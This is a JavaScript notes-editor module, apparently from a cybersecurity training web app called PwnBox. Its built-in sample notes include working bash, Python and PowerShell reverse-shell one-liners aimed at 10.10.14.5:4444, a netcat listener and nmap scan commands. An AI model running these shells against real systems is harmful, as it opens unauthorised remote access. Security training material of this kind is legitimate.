/**
 * PWNBOX CYBER COMMAND — OPERATIVE NOTES & IN-STREAM PAYLOAD VAULT ENGINE
 * Features:
 * - In-Stream Code Blocks (inserted anywhere inside note text)
 * - Interactive Terminal View with 1-Click Code Copy
 * - Firebase Cloud & LocalStorage Auto-Sync
 * - Tab indentation support in editor
 */

(function () {
    'use strict';

    // ── 1. GLOBAL STATE ──
    let notes = [];
    let activeNoteId = null;
    let currentCategoryFilter = 'all';
    let searchQuery = '';
    let autoSaveTimeout = null;
    let currentUser = null;
    let firestoreDb = null;
    let isPreviewMode = false;

    // Preset Default Academy Note for Guests (Explaining PwnBox & Creator Pranav)
    const DEFAULT_ACADEMY_NOTE = {
        id: 'pwnbox_briefing_default',
        title: '🛡️ PwnBox Cyber Academy // Architecture & Creator Briefing',
        category: 'General',
        tags: 'pwnbox, briefing, pranav, cyber-range, ceh',
        content: `### 🌐 WELCOME TO PWNBOX CYBER COMMAND & ACADEMY

**PwnBox** is a premier browser-based offensive and defensive cybersecurity simulation suite and Certified Ethical Hacker (CEH v12/v13) training platform. Built using a high-contrast Bauhaus design language, a live Three.js 3D quantum matrix viewport, and client-side zero-latency laboratories.

---

### 👨‍💻 ARCHITECT & CREATOR
* **Created & Engineered by:** **Pranav**
* **Project Mission:** Bridging the gap between static cybersecurity theory and hands-on offensive operations, reconnaissance tools, and realistic CTF challenges.
* **Core Philosophy:** Pure browser autonomy. Every network tool, cipher simulator, exploit generator, and command cheatsheet operates instantly without requiring bulky software installations.

---

### ⚡ PLATFORM HIGHLIGHTS & CAPABILITIES
- **8 Comprehensive Curriculum Modules:** Footprinting, Network Scanning, Enumeration, Vulnerability Analysis, System Exploitation, Web App Threats, OSINT Threat Intel, and Black Ops C2 Operations.
- **Master Guide & Career Roadmap:** Interactive 4-phase methodology tracking with progress benchmarks from fundamentals to CEH mastery.
- **Tactical Cyber Arcade:** 8 standalone interactive mini-games (SQLi Locksmith, Packet Gatekeeper, Phish Detective, CIDR Defender, etc.).
- **Live Terminal & Payload Vault:** In-stream syntax-highlighted code blocks with 1-click clipboard staging and cloud persistence.

---

### 🔐 GUEST CLEARANCE NOTICE
You are currently viewing PwnBox in **Guest Read-Only Mode**.
* You can view and explore this official briefing note.
* Creating new tactical notes, editing payloads, exporting/importing, and saving notes to the cloud requires an **authenticated operative account**.
* Click **"GUEST MODE"** in the top navigation or sign in from the Dashboard ID Card to authenticate.`,
        pinned: true,
        createdAt: Date.now() - 86400000,
        updatedAt: Date.now()
    };

    // Preset Sample Notes showcasing in-stream code blocks for authenticated users
    const SAMPLE_NOTES = [
        {
            id: 'sample_revshell',
            title: '🔥 Reverse Shell Quick Arsenal (Linux & Windows)',
            category: 'Exploits',
            tags: 'payloads, reverse-shell, netcat, python',
            content: `Tactical one-liners for obtaining interactive reverse shells during target exploitation phase. Replace ATTACKER_IP and ATTACKER_PORT with your active LHOST and LPORT.

### 1. Bash TCP One-Liner (Stealth)
\`\`\`bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
\`\`\`

### 2. Python 3 Interactive Shell Stager
\`\`\`python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
\`\`\`

### 3. PowerShell In-Memory TCP Client
\`\`\`powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.5",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
\`\`\`

---
*Tip: Catch with \`nc -lvnp 4444\` or \`pwncat-cs\`.*`,
            pinned: true,
            createdAt: Date.now() - 3600000,
            updatedAt: Date.now() - 1800000
        },
        {
            id: 'sample_nmap',
            title: '🔍 Nmap Stealth Scanning & NSE Enumeration Cheatsheet',
            category: 'Recon',
            tags: 'nmap, recon, ports, scripts',
            content: `Standard scanning methodology covering host discovery, high-speed SYN port sweep, and vulnerability identification with NSE scripts.

### Step 1: Rapid Host & Port Discovery
\`\`\`bash
nmap -sS -p- --min-rate 5000 -T4 -v -n 192.168.1.100 -oN nmap_allports.txt
\`\`\`

### Step 2: Comprehensive Vulnerability & Version Probe
\`\`\`bash
nmap -sC -sV -p 22,80,443,445 --script vuln,auth,default -oA nmap_detailed 192.168.1.100
\`\`\`

- [ ] Check open web ports (80/443) with Nikto
- [ ] Enumerate SMB shares (445) with \`crackmapexec\`
- [ ] Inspect SSH banner on port 22`,
            pinned: false,
            createdAt: Date.now() - 7200000,
            updatedAt: Date.now() - 3600000
        }
    ];

    function isUserAuthenticated() {
        return (currentUser !== null) || (localStorage.getItem('pwnbox_is_authenticated') === 'true');
    }

    function applyGuestRestrictions(isGuest) {
        const titleInput = document.getElementById('noteTitleInput');
        const catSelect = document.getElementById('noteCategorySelect');
        const tagsInput = document.getElementById('noteTagsInput');
        const contentTextarea = document.getElementById('noteContentTextarea');
        const instreamToolbar = document.getElementById('instreamCodeToolbar');
        const saveIndicator = document.getElementById('editorSaveIndicator');

        if (titleInput) titleInput.readOnly = isGuest;
        if (tagsInput) tagsInput.readOnly = isGuest;
        if (catSelect) catSelect.disabled = isGuest;
        if (contentTextarea) contentTextarea.readOnly = isGuest;
        if (instreamToolbar) instreamToolbar.style.opacity = isGuest ? '0.35' : '1';

        if (saveIndicator) {
            if (isGuest) {
                saveIndicator.textContent = '🔒 GUEST READ-ONLY (SIGN IN TO EDIT/ADD)';
                saveIndicator.style.color = '#f59e0b';
            } else {
                saveIndicator.textContent = '';
            }
        }
    }

    // ── 2. INITIALIZATION & AUTH INTEGRATION ──
    document.addEventListener('DOMContentLoaded', () => {
        initFirestore();
        setupEventListeners();
        listenToAuth();
    });

    function initFirestore() {
        if (typeof firebase !== 'undefined' && typeof firebase.firestore === 'function') {
            try {
                if (!firebase.apps.length) {
                    firebase.initializeApp(window.defaultFirebaseConfig || {});
                }
                firestoreDb = firebase.firestore();
            } catch (e) {
                console.warn("Firestore notice:", e.message);
            }
        }
    }

    function listenToAuth() {
        if (typeof firebase !== 'undefined' && typeof firebase.auth === 'function') {
            try {
                const auth = firebase.auth();
                auth.onAuthStateChanged((user) => {
                    currentUser = user;
                    updateSyncBadge(user);
                    loadNotesForUser(user);
                });
                return;
            } catch (e) {
                console.warn("Auth check notice:", e);
            }
        }
        updateSyncBadge(null);
        loadNotesForUser(null);
    }

    function updateSyncBadge(user) {
        const badge = document.getElementById('notesSyncBadge');
        if (!badge) return;

        if (user) {
            const name = user.displayName || (user.email ? user.email.split('@')[0] : 'OPERATIVE');
            badge.className = 'notes-sync-badge';
            badge.innerHTML = `<span>🟢</span><span>CLOUD SYNCED: ${name.toUpperCase()}</span>`;
            badge.onclick = null;
            badge.title = `Signed in as ${user.email} (All notes auto-saved to Cloud & Local Cache)`;
        } else {
            badge.className = 'notes-sync-badge guest';
            badge.innerHTML = `<span>🟡</span><span>GUEST MODE (CLICK TO SIGN IN & SYNC)</span>`;
            badge.onclick = () => {
                if (typeof window.openAuthModal === 'function') {
                    window.openAuthModal();
                }
            };
            badge.title = "Click to Sign In with Google or Firebase to sync notes across devices";
        }
    }

    // ── 3. DATA PERSISTENCE (CLOUD + LOCAL) ──
    function getStorageKey(user) {
        if (user && user.uid) {
            return `pwnbox_notes_${user.uid}`;
        }
        return 'pwnbox_notes_guest';
    }

    async function loadNotesForUser(user) {
        if (!isUserAuthenticated()) {
            applyGuestRestrictions(true);
            notes = [JSON.parse(JSON.stringify(DEFAULT_ACADEMY_NOTE))];
            activeNoteId = notes[0].id;
            selectNote(activeNoteId);
            renderNotesList();
            return;
        }

        applyGuestRestrictions(false);
        const key = getStorageKey(user);
        let loaded = null;

        // 1. Read local cache
        try {
            const localData = localStorage.getItem(key);
            if (localData) {
                loaded = JSON.parse(localData);
            }
        } catch (e) {
            console.error("Failed to parse local notes:", e);
        }

        // 2. Fetch cloud data if signed in
        if (user && firestoreDb) {
            try {
                const docRef = firestoreDb.collection('users').doc(user.uid).collection('vault').doc('tactical_notes');
                const docSnap = await docRef.get();
                if (docSnap.exists) {
                    const cloudData = docSnap.data();
                    if (cloudData && Array.isArray(cloudData.notes)) {
                        loaded = cloudData.notes;
                        localStorage.setItem(key, JSON.stringify(loaded));
                    }
                } else if (loaded && loaded.length > 0) {
                    await docRef.set({
                        notes: loaded,
                        lastSync: Date.now(),
                        agentEmail: user.email || ''
                    }, { merge: true });
                }
            } catch (err) {
                console.warn("Firestore fetch error:", err.message);
            }
        }

        // 3. Fallback to sample notes if empty
        if (!loaded || !Array.isArray(loaded) || loaded.length === 0) {
            loaded = JSON.parse(JSON.stringify(SAMPLE_NOTES));
            localStorage.setItem(key, JSON.stringify(loaded));
        }

        notes = loaded;

        if (notes.length > 0) {
            const targetId = activeNoteId && notes.some(n => n.id === activeNoteId) ? activeNoteId : notes[0].id;
            selectNote(targetId);
        } else {
            activeNoteId = null;
            renderEmptyEditor();
        }

        renderNotesList();
    }

    async function persistNotes() {
        if (!isUserAuthenticated()) return;
        const key = getStorageKey(currentUser);
        try {
            localStorage.setItem(key, JSON.stringify(notes));
        } catch (e) {
            console.error("Local storage save error:", e);
        }

        if (currentUser && firestoreDb) {
            try {
                const docRef = firestoreDb.collection('users').doc(currentUser.uid).collection('vault').doc('tactical_notes');
                await docRef.set({
                    notes: notes,
                    lastSync: Date.now(),
                    agentEmail: currentUser.email || ''
                }, { merge: true });
            } catch (err) {
                console.warn("Cloud sync error:", err.message);
            }
        }
    }

    // ── 4. NOTES LIST RENDERING ──
    function renderNotesList() {
        const listEl = document.getElementById('notesListFeed');
        const countEl = document.getElementById('notesCountBadge');
        if (!listEl) return;

        let filtered = notes.filter(note => {
            const matchesCat = (currentCategoryFilter === 'all') || (note.category && note.category.toLowerCase() === currentCategoryFilter.toLowerCase());
            if (!matchesCat) return false;

            if (!searchQuery.trim()) return true;
            const q = searchQuery.toLowerCase();
            const inTitle = (note.title || '').toLowerCase().includes(q);
            const inContent = (note.content || '').toLowerCase().includes(q);
            const inTags = (note.tags || '').toLowerCase().includes(q);
            return inTitle || inContent || inTags;
        });

        filtered.sort((a, b) => {
            if (a.pinned !== b.pinned) return a.pinned ? -1 : 1;
            return (b.updatedAt || 0) - (a.updatedAt || 0);
        });

        if (countEl) {
            countEl.textContent = `${filtered.length} / ${notes.length}`;
        }

        listEl.innerHTML = '';

        if (filtered.length === 0) {
            listEl.innerHTML = `
                <div style="text-align: center; padding: 40px 20px; color: var(--text-muted); font-family: 'Space Mono', monospace; font-size: 0.8rem;">
                    <div style="font-size: 2rem; margin-bottom: 8px;">📭</div>
                    <div>NO TACTICAL NOTES FOUND</div>
                    <div style="font-size: 0.68rem; margin-top: 4px; color: #888;">Try changing filter or click "+ New Note"</div>
                </div>
            `;
            return;
        }

        filtered.forEach(note => {
            const card = document.createElement('div');
            card.className = `note-item-card ${note.id === activeNoteId ? 'active' : ''}`;
            card.onclick = () => selectNote(note.id);

            // Count code blocks in markdown content (matching ```)
            const codeBlocksMatches = (note.content || '').match(/```[\s\S]*?```/g);
            const codeCount = codeBlocksMatches ? codeBlocksMatches.length : 0;

            const updatedDate = new Date(note.updatedAt || Date.now()).toLocaleDateString(undefined, {
                month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit'
            });

            const catColors = {
                'exploits': '#ef4444',
                'recon': '#00c8d7',
                'commands': '#f59e0b',
                'credentials': '#10b981',
                'web': '#a855f7',
                'general': '#3b82f6'
            };
            const catKey = (note.category || 'general').toLowerCase();
            const badgeColor = catColors[catKey] || '#888888';

            // Clean snippet for preview (strip code blocks for clean text preview)
            const cleanText = (note.content || '').replace(/```[\s\S]*?```/g, '[Code Block]').replace(/[#*`_]/g, '').trim();

            card.innerHTML = `
                <div class="note-item-top">
                    <span class="note-item-title">${note.pinned ? '📌 ' : ''}${escapeHtml(note.title || 'Untitled Note')}</span>
                    <span class="note-item-badge" style="color: ${badgeColor}; border-color: ${badgeColor};">${escapeHtml(note.category || 'GENERAL')}</span>
                </div>
                <div class="note-item-snippet">${escapeHtml(cleanText.slice(0, 95) || 'No notes content...')}</div>
                <div class="note-item-footer">
                    <span>${updatedDate}</span>
                    ${codeCount > 0 ? `<span class="note-item-code-count">⚡ ${codeCount} CODE BLOCK${codeCount > 1 ? 'S' : ''}</span>` : ''}
                </div>
            `;

            listEl.appendChild(card);
        });
    }

    // ── 5. NOTE SELECTION & EDITOR RENDERING ──
    function selectNote(noteId) {
        activeNoteId = noteId;
        const note = notes.find(n => n.id === noteId);
        if (!note) {
            renderEmptyEditor();
            return;
        }

        const editorWrapper = document.getElementById('noteEditorWrapper');
        const emptyState = document.getElementById('editorEmptyState');
        if (editorWrapper) editorWrapper.style.display = 'flex';
        if (emptyState) emptyState.style.display = 'none';

        const titleInput = document.getElementById('noteTitleInput');
        const catSelect = document.getElementById('noteCategorySelect');
        const tagsInput = document.getElementById('noteTagsInput');
        const contentTextarea = document.getElementById('noteContentTextarea');
        const pinBtn = document.getElementById('notePinToggleBtn');

        if (titleInput) titleInput.value = note.title || '';
        if (catSelect) catSelect.value = note.category || 'General';
        if (tagsInput) tagsInput.value = note.tags || '';
        if (contentTextarea) contentTextarea.value = note.content || '';

        if (pinBtn) {
            pinBtn.innerHTML = note.pinned ? '📌 UNPIN' : '📍 PIN NOTE';
            pinBtn.style.color = note.pinned ? '#f59e0b' : 'var(--text-main)';
        }

        // If in preview mode, update preview
        if (isPreviewMode) {
            renderPreviewView();
        }

        updateStats();
        renderNotesList();
    }

    function renderEmptyEditor() {
        const editorWrapper = document.getElementById('noteEditorWrapper');
        const emptyState = document.getElementById('editorEmptyState');
        if (editorWrapper) editorWrapper.style.display = 'none';
        if (emptyState) emptyState.style.display = 'flex';
    }

    // ── 6. IN-STREAM CODE BLOCK INSERTION (WHEREVER USER IS TYPING) ──
    function insertCodeBlockAtCursor(language = null) {
        if (!isUserAuthenticated()) {
            if (typeof window.tacticalToast === 'function') {
                window.tacticalToast("You cannot edit notes without signing in.", "warning");
            } else if (typeof window.showSystemAlert === 'function') {
                window.showSystemAlert("You cannot edit notes without signing in.");
            }
            return;
        }
        const textarea = document.getElementById('noteContentTextarea');
        if (!textarea) return;

        // Ensure we are in Edit Mode
        if (isPreviewMode) {
            toggleViewMode(false);
        }

        const langSelect = document.getElementById('instreamLangSelect');
        const chosenLang = language || (langSelect ? langSelect.value : 'bash') || 'bash';

        const start = textarea.selectionStart;
        const end = textarea.selectionEnd;
        const currentVal = textarea.value;

        // Code block template
        const prefix = (start > 0 && currentVal[start - 1] !== '\n') ? '\n\n' : (start === 0 ? '' : '\n');
        const codePlaceholder = `# Enter your ${chosenLang} code / payload here`;
        const codeSnippet = `${prefix}\`\`\`${chosenLang}\n${codePlaceholder}\n\`\`\`\n`;

        textarea.value = currentVal.substring(0, start) + codeSnippet + currentVal.substring(end);

        // Highlight placeholder so user can immediately type or paste
        const newCursorStart = start + prefix.length + chosenLang.length + 4; // position after ```lang\n
        const newCursorEnd = newCursorStart + codePlaceholder.length;
        textarea.focus();
        textarea.setSelectionRange(newCursorStart, newCursorEnd);

        // Update active note content
        updateNoteField('content', textarea.value);

        if (typeof window.tacticalToast === 'function') {
            window.tacticalToast(`Inserted ${chosenLang.toUpperCase()} code block`, 'success');
        }
    }

    function insertMarkdownSnippet(type) {
        if (!isUserAuthenticated()) {
            if (typeof window.tacticalToast === 'function') {
                window.tacticalToast("You cannot edit notes without signing in.", "warning");
            } else if (typeof window.showSystemAlert === 'function') {
                window.showSystemAlert("You cannot edit notes without signing in.");
            }
            return;
        }
        const textarea = document.getElementById('noteContentTextarea');
        if (!textarea) return;

        if (isPreviewMode) toggleViewMode(false);

        const start = textarea.selectionStart;
        const end = textarea.selectionEnd;
        const currentVal = textarea.value;
        const selectedText = currentVal.substring(start, end);

        let replacement = '';
        let selectOffsetStart = start;
        let selectOffsetEnd = end;

        switch (type) {
            case 'bold':
                replacement = `**${selectedText || 'important'}**`;
                selectOffsetStart = start + 2;
                selectOffsetEnd = selectOffsetStart + (selectedText ? selectedText.length : 9);
                break;
            case 'inlineCode':
                replacement = `\`${selectedText || 'command'}\``;
                selectOffsetStart = start + 1;
                selectOffsetEnd = selectOffsetStart + (selectedText ? selectedText.length : 7);
                break;
            case 'heading':
                const prefix = (start > 0 && currentVal[start - 1] !== '\n') ? '\n\n' : '';
                replacement = `${prefix}### ${selectedText || 'Section Header'}\n`;
                selectOffsetStart = start + prefix.length + 4;
                selectOffsetEnd = selectOffsetStart + (selectedText ? selectedText.length : 14);
                break;
            case 'task':
                const tPrefix = (start > 0 && currentVal[start - 1] !== '\n') ? '\n' : '';
                replacement = `${tPrefix}- [ ] ${selectedText || 'Task action item'}\n`;
                selectOffsetStart = start + tPrefix.length + 6;
                selectOffsetEnd = selectOffsetStart + (selectedText ? selectedText.length : 16);
                break;
        }

        textarea.value = currentVal.substring(0, start) + replacement + currentVal.substring(end);
        textarea.focus();
        textarea.setSelectionRange(selectOffsetStart, selectOffsetEnd);

        updateNoteField('content', textarea.value);
    }

    // ── 7. VIEW MODE TOGGLE (EDIT vs INTERACTIVE RENDERED VIEW) ──
    function toggleViewMode(forceMode = null) {
        if (forceMode !== null) {
            isPreviewMode = forceMode;
        } else {
            isPreviewMode = !isPreviewMode;
        }

        const textarea = document.getElementById('noteContentTextarea');
        const previewEl = document.getElementById('noteRenderedView');
        const toggleBtn = document.getElementById('noteViewToggleBtn');
        const instreamToolbar = document.getElementById('instreamCodeToolbar');

        if (!textarea || !previewEl || !toggleBtn) return;

        if (isPreviewMode) {
            // Switch to Preview
            textarea.style.display = 'none';
            previewEl.style.display = 'block';
            if (instreamToolbar) instreamToolbar.style.opacity = '0.4';
            toggleBtn.innerHTML = `<span>✏️</span><span>EDIT NOTE</span>`;
            toggleBtn.className = 'editor-btn btn-view-toggle';
            renderPreviewView();
        } else {
            // Switch to Edit
            textarea.style.display = 'block';
            previewEl.style.display = 'none';
            if (instreamToolbar) instreamToolbar.style.opacity = '1';
            toggleBtn.innerHTML = `<span>👁️</span><span>PREVIEW</span>`;
            toggleBtn.className = 'editor-btn';
            textarea.focus();
        }
    }

    // Render markdown and turn all code blocks into interactive Hacker Terminal boxes with 1-click copy
    function renderPreviewView() {
        const previewEl = document.getElementById('noteRenderedView');
        const note = getActiveNote();
        if (!previewEl || !note) return;

        const rawContent = note.content || '';
        let html = '';

        // Tokenize code blocks
        const codeBlockRegex = /```([^\n\r]*)\r?\n([\s\S]*?)```/g;
        let lastIndex = 0;
        let match;
        let blockIndex = 0;

        while ((match = codeBlockRegex.exec(rawContent)) !== null) {
            // Text before code block
            const textChunk = rawContent.substring(lastIndex, match.index);
            html += parseMarkdownText(textChunk);

            // The code block itself
            const lang = match[1] || 'bash';
            const code = match[2] || '';
            const blockId = `term_cb_${blockIndex++}`;

            html += `
                <div class="terminal-code-box">
                    <div class="terminal-code-header">
                        <div class="terminal-dots">
                            <span class="terminal-dot t-dot-red"></span>
                            <span class="terminal-dot t-dot-yellow"></span>
                            <span class="terminal-dot t-dot-green"></span>
                        </div>
                        <span class="terminal-lang-badge">${escapeHtml(lang)}</span>
                        <button class="terminal-copy-btn" onclick="window.PwnNotes.copyDirectCode(decodeURIComponent('${encodeURIComponent(code)}'), this)" title="Copy Code Snippet">
                            📋 COPY CODE
                        </button>
                    </div>
                    <pre class="terminal-code-body">${escapeHtml(code)}</pre>
                </div>
            `;

            lastIndex = codeBlockRegex.lastIndex;
        }

        // Remainder text
        if (lastIndex < rawContent.length) {
            html += parseMarkdownText(rawContent.substring(lastIndex));
        }

        if (!html.trim()) {
            html = `<div style="color: var(--text-muted); font-style: italic; padding: 20px 0;">No content yet. Click "EDIT NOTE" to write notes or insert code blocks.</div>`;
        }

        previewEl.innerHTML = html;
    }

    // Markdown Parser
    function parseMarkdownText(text) {
        if (!text) return '';
        let out = escapeHtml(text);

        // Headings
        out = out.replace(/^### (.*$)/gim, '<h3>$1</h3>');
        out = out.replace(/^## (.*$)/gim, '<h2>$1</h2>');
        out = out.replace(/^# (.*$)/gim, '<h1>$1</h1>');

        // Bold & Italic
        out = out.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>');
        out = out.replace(/\*(.*?)\*/g, '<em>$1</em>');

        // Inline Code
        out = out.replace(/`([^`]+)`/g, '<code class="inline-code">$1</code>');

        // Checklists
        out = out.replace(/^- \[ \] (.*$)/gim, '<div style="display:flex;align-items:center;gap:8px;margin:4px 0;"><input type="checkbox" disabled> <span>$1</span></div>');
        out = out.replace(/^- \[x\] (.*$)/gim, '<div style="display:flex;align-items:center;gap:8px;margin:4px 0;"><input type="checkbox" checked disabled> <span style="text-decoration:line-through;color:var(--text-muted);">$1</span></div>');

        // Bullet lists
        out = out.replace(/^- (.*$)/gim, '<li style="margin-left:20px;">$1</li>');

        // Paragraph breaks
        out = out.replace(/\n\n/g, '</p><p>');
        out = '<p>' + out + '</p>';

        return out;
    }

    function copyDirectCode(codeStr, btnEl) {
        navigator.clipboard.writeText(codeStr).then(() => {
            if (btnEl) {
                const prev = btnEl.innerHTML;
                btnEl.innerHTML = '✅ COPIED!';
                btnEl.style.color = '#10b981';
                setTimeout(() => {
                    btnEl.innerHTML = prev;
                    btnEl.style.color = '';
                }, 1500);
            }
            if (typeof window.tacticalToast === 'function') {
                window.tacticalToast('Code snippet copied to clipboard', 'success');
            }
        });
    }

    // ── 8. NOTE CRUD & EDITING ──
    function createNewNote() {
        if (!isUserAuthenticated()) {
            if (typeof window.tacticalToast === 'function') {
                window.tacticalToast("You cannot create notes without signing in.", "warning");
            } else if (typeof window.showSystemAlert === 'function') {
                window.showSystemAlert("You cannot create notes without signing in.");
            }
            return;
        }

        const newNote = {
            id: 'note_' + Date.now(),
            title: 'Untitled Tactical Note',
            category: currentCategoryFilter !== 'all' ? capitalize(currentCategoryFilter) : 'General',
            tags: '',
            content: '',
            pinned: false,
            createdAt: Date.now(),
            updatedAt: Date.now()
        };

        notes.unshift(newNote);
        activeNoteId = newNote.id;

        if (isPreviewMode) toggleViewMode(false);

        selectNote(newNote.id);
        persistNotes();
        renderNotesList();

        setTimeout(() => {
            const titleInput = document.getElementById('noteTitleInput');
            if (titleInput) {
                titleInput.focus();
                titleInput.select();
            }
        }, 50);
    }

    function deleteActiveNote() {
        if (!isUserAuthenticated()) {
            if (typeof window.tacticalToast === 'function') {
                window.tacticalToast("The default briefing note cannot be deleted.", "info");
            } else if (typeof window.showSystemAlert === 'function') {
                window.showSystemAlert("The default briefing note cannot be deleted.");
            }
            return;
        }

        const note = getActiveNote();
        if (!note) return;

        const performDelete = () => {
            notes = notes.filter(n => n.id !== note.id);
            activeNoteId = notes.length > 0 ? notes[0].id : null;
            persistNotes();
            renderNotesList();

            if (activeNoteId) {
                selectNote(activeNoteId);
            } else {
                renderEmptyEditor();
            }

            if (typeof window.tacticalToast === 'function') {
                window.tacticalToast(`Note deleted: ${note.title}`, 'danger');
            }
        };

        if (typeof window.tacticalConfirm === 'function') {
            window.tacticalConfirm({
                title: "PURGE NOTE",
                message: `Are you sure you want to delete "${note.title}"?\nThis action cannot be undone.`,
                confirmText: "DELETE NOTE",
                cancelText: "CANCEL",
                type: "danger",
                onConfirm: performDelete
            });
        } else if (confirm(`Delete note "${note.title}"?`)) {
            performDelete();
        }
    }

    function togglePinActiveNote() {
        if (!isUserAuthenticated()) return;
        const note = getActiveNote();
        if (!note) return;

        note.pinned = !note.pinned;
        note.updatedAt = Date.now();

        const pinBtn = document.getElementById('notePinToggleBtn');
        if (pinBtn) {
            pinBtn.innerHTML = note.pinned ? '📌 UNPIN' : '📍 PIN NOTE';
            pinBtn.style.color = note.pinned ? '#f59e0b' : 'var(--text-main)';
        }

        persistNotes();
        renderNotesList();
    }

    function duplicateActiveNote() {
        if (!isUserAuthenticated()) {
            if (typeof window.tacticalToast === 'function') {
                window.tacticalToast("You cannot clone notes without signing in.", "warning");
            } else if (typeof window.showSystemAlert === 'function') {
                window.showSystemAlert("You cannot clone notes without signing in.");
            }
            return;
        }

        const note = getActiveNote();
        if (!note) return;

        const clone = JSON.parse(JSON.stringify(note));
        clone.id = 'note_' + Date.now();
        clone.title = `${note.title} (Copy)`;
        clone.createdAt = Date.now();
        clone.updatedAt = Date.now();
        clone.pinned = false;

        notes.unshift(clone);
        selectNote(clone.id);
        persistNotes();
        renderNotesList();

        if (typeof window.tacticalToast === 'function') {
            window.tacticalToast(`Note duplicated: ${clone.title}`, 'info');
        }
    }

    function getActiveNote() {
        return notes.find(n => n.id === activeNoteId);
    }

    function updateNoteField(field, value) {
        if (!isUserAuthenticated()) return;
        const note = getActiveNote();
        if (!note) return;

        note[field] = value;
        note.updatedAt = Date.now();

        triggerAutoSave();
        updateStats();

        if (field === 'title' || field === 'category') {
            renderNotesList();
        }
    }

    function triggerAutoSave() {
        if (!isUserAuthenticated()) return;
        showSaveIndicator('SAVING...', '#f59e0b');
        clearTimeout(autoSaveTimeout);
        autoSaveTimeout = setTimeout(() => {
            persistNotes();
            showSaveIndicator('SAVED ✓', '#10b981');
            setTimeout(() => {
                showSaveIndicator('', '');
            }, 2500);
        }, 500);
    }

    function manualSave() {
        if (!isUserAuthenticated()) {
            if (typeof window.tacticalToast === 'function') {
                window.tacticalToast("You cannot save notes without signing in.", "warning");
            } else if (typeof window.showSystemAlert === 'function') {
                window.showSystemAlert("You cannot save notes without signing in.");
            }
            return;
        }
        persistNotes();
        showSaveIndicator('SAVED ✓', '#10b981');
        setTimeout(() => {
            showSaveIndicator('', '');
        }, 2000);
        if (typeof window.tacticalToast === 'function') {
            window.tacticalToast('Note saved successfully', 'success');
        }
    }

    function showSaveIndicator(text, color) {
        const indicator = document.getElementById('editorSaveIndicator');
        if (!indicator) return;
        indicator.textContent = text;
        indicator.style.color = color || 'var(--text-muted)';
    }

    function updateStats() {
        const note = getActiveNote();
        const statEl = document.getElementById('editorStatsDisplay');
        if (!statEl || !note) return;

        const words = (note.content || '').trim().split(/\s+/).filter(Boolean).length;
        const chars = (note.content || '').length;
        const codeBlocksMatches = (note.content || '').match(/```[\s\S]*?```/g);
        const codeCount = codeBlocksMatches ? codeBlocksMatches.length : 0;
        const updatedTime = new Date(note.updatedAt || Date.now()).toLocaleTimeString();

        statEl.textContent = `${words} Words | ${chars} Chars | ${codeCount} Code Block(s) | Last Saved: ${updatedTime}`;
    }

    // ── 9. EXPORT & BACKUP HELPERS ──
    function exportActiveMarkdown() {
        const note = getActiveNote();
        if (!note) return;

        let md = `# ${note.title}\n\n`;
        md += `**Category:** ${note.category || 'General'}  \n`;
        if (note.tags) md += `**Tags:** ${note.tags}  \n`;
        md += `**Date:** ${new Date(note.createdAt).toLocaleString()}  \n\n`;
        md += `---\n\n`;
        md += `${note.content || ''}\n`;

        downloadBlob(md, `${sanitizeFilename(note.title || 'note')}.md`, 'text/markdown');
    }

    function exportAllNotesBackup() {
        const data = {
            pwnboxVersion: 'v3.4.0',
            exportedAt: new Date().toISOString(),
            agent: currentUser ? (currentUser.displayName || currentUser.email) : 'GUEST_OPERATOR',
            notesCount: notes.length,
            notes: notes
        };
        downloadBlob(JSON.stringify(data, null, 2), `pwnbox_notes_backup_${Date.now()}.json`, 'application/json');
    }

    function importNotesTrigger() {
        if (!isUserAuthenticated()) {
            if (typeof window.tacticalToast === 'function') {
                window.tacticalToast("You cannot import notes without signing in.", "warning");
            } else if (typeof window.showSystemAlert === 'function') {
                window.showSystemAlert("You cannot import notes without signing in.");
            }
            return;
        }
        const input = document.getElementById('notesImportFileInput');
        if (input) input.click();
    }

    function handleImportFile(file) {
        if (!file) return;
        const reader = new FileReader();
        reader.onload = (e) => {
            try {
                const parsed = JSON.parse(e.target.result);
                let importedNotes = Array.isArray(parsed) ? parsed : (parsed.notes || []);

                if (importedNotes.length === 0) {
                    alert('No valid notes found in imported JSON file.');
                    return;
                }

                importedNotes.forEach(imp => {
                    const existingIdx = notes.findIndex(n => n.id === imp.id);
                    if (existingIdx !== -1) {
                        imp.id = 'note_' + Date.now() + '_' + Math.floor(Math.random() * 1000);
                    }
                    notes.unshift(imp);
                });

                persistNotes();
                renderNotesList();
                if (notes.length > 0) selectNote(notes[0].id);

                if (typeof window.tacticalToast === 'function') {
                    window.tacticalToast(`Imported ${importedNotes.length} notes successfully!`, 'success');
                }
            } catch (err) {
                alert('Invalid JSON file format: ' + err.message);
            }
        };
        reader.readAsText(file);
    }

    // ── 10. EVENT LISTENERS SETUP ──
    function setupEventListeners() {
        const searchInput = document.getElementById('notesSearchInput');
        const clearBtn = document.getElementById('notesSearchClear');
        if (searchInput) {
            searchInput.addEventListener('input', (e) => {
                searchQuery = e.target.value;
                if (clearBtn) clearBtn.style.display = searchQuery ? 'block' : 'none';
                renderNotesList();
            });
        }
        if (clearBtn) {
            clearBtn.addEventListener('click', () => {
                if (searchInput) searchInput.value = '';
                searchQuery = '';
                clearBtn.style.display = 'none';
                renderNotesList();
            });
        }

        const filterPills = document.querySelectorAll('.notes-filter-pill');
        filterPills.forEach(pill => {
            pill.addEventListener('click', () => {
                filterPills.forEach(p => p.classList.remove('active'));
                pill.classList.add('active');
                currentCategoryFilter = pill.getAttribute('data-category') || 'all';
                renderNotesList();
            });
        });

        const titleInput = document.getElementById('noteTitleInput');
        const catSelect = document.getElementById('noteCategorySelect');
